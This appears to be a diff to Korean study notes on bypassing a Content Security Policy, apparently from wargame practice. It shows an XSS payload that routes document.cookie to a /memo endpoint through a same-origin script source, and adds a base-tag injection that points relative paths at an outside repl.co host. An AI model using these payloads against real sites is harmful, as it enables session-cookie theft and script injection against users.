@@ -18,6 +18,7 @@ XSS 공격의 피해를 줄이기 위해, 웹 페이지에 사용될 수 있는 
 ### 에시 CSP Bypass
 
 default-src가 self라면, 스스로가 접속하도록 유도하면 된다.
+
 ```js
 <script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie"></script>
 ```
@@ -26,3 +27,7 @@ default-src가 self라면, 스스로가 접속하도록 유도하면 된다.
 
 base-uri 설정이 없다면, base를 바꿀 수 있다.
 HTML `base` 태그는 초기경로를 설정해주며 이에따라 경로가 해석되는 기준점을 변경할 수 있다.
+
+```js
+<base href="https://cspadvanced.jaeho211.repl.co">
+```
